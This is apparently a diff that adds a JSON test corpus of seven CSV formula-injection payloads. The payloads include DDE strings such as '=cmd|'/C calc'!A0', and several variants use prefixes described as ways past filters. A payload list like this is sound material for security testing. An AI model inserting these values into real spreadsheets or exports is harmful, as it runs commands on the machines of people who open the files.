@@ -1,0 +1,72 @@
+[
+  {
+    "id": "formula-001",
+    "family": "formula_injection",
+    "subtype": "csv",
+    "payload_string": "=cmd|'/C calc'!A0",
+    "context": "string",
+    "description": "CSV formula injection to execute calculator via Excel DDE",
+    "references": ["https://www.owasp.org/index.php/CSV_Injection"],
+    "platform_specific": {"windows": true}
+  },
+  {
+    "id": "formula-002",
+    "family": "formula_injection",
+    "subtype": "csv",
+    "payload_string": "=SYSTEM(\"id\")",
+    "context": "string",
+    "description": "CSV formula injection using SYSTEM function",
+    "references": ["https://www.owasp.org/index.php/CSV_Injection"],
+    "platform_specific": {"windows": true}
+  },
+  {
+    "id": "formula-003",
+    "family": "formula_injection",
+    "subtype": "csv",
+    "payload_string": "@SUM(1+1)*cmd|'/C calc'!A0",
+    "context": "string",
+    "description": "CSV formula injection with prefix to bypass CSV parsers",
+    "references": ["https://www.owasp.org/index.php/CSV_Injection"],
+    "platform_specific": {"windows": true}
+  },
+  {
+    "id": "formula-004",
+    "family": "formula_injection",
+    "subtype": "csv",
+    "payload_string": "+cmd|'/C calc'!A0",
+    "context": "string",
+    "description": "CSV formula injection with plus prefix",
+    "references": ["https://www.owasp.org/index.php/CSV_Injection"],
+    "platform_specific": {"windows": true}
+  },
+  {
+    "id": "formula-005",
+    "family": "formula_injection",
+    "subtype": "csv",
+    "payload_string": "-cmd|'/C calc'!A0",
+    "context": "string",
+    "description": "CSV formula injection with minus prefix",
+    "references": ["https://www.owasp.org/index.php/CSV_Injection"],
+    "platform_specific": {"windows": true}
+  },
+  {
+    "id": "formula-006",
+    "family": "formula_injection",
+    "subtype": "csv",
+    "payload_string": "\t=cmd|'/C calc'!A0",
+    "context": "string",
+    "description": "CSV formula injection with tab prefix to bypass filters",
+    "references": ["https://www.owasp.org/index.php/CSV_Injection"],
+    "platform_specific": {"windows": true}
+  },
+  {
+    "id": "formula-007",
+    "family": "formula_injection",
+    "subtype": "csv",
+    "payload_string": "\r\n=cmd|'/C calc'!A0",
+    "context": "string",
+    "description": "CSV formula injection with CRLF prefix",
+    "references": ["https://www.owasp.org/index.php/CSV_Injection"],
+    "platform_specific": {"windows": true}
+  }
+]
